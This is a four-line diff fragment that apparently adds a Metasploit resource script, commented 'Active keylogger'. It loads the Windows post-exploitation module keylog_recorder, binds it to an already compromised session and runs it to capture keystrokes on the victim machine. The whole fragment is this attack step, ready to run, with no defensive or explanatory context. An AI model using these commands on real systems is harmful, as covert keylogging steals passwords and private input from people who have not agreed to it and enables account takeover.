@@ -1,0 +1,4 @@
+# Active keylogger
+use post/windows/capture/keylog_recorder
+set SESSION 1
+run
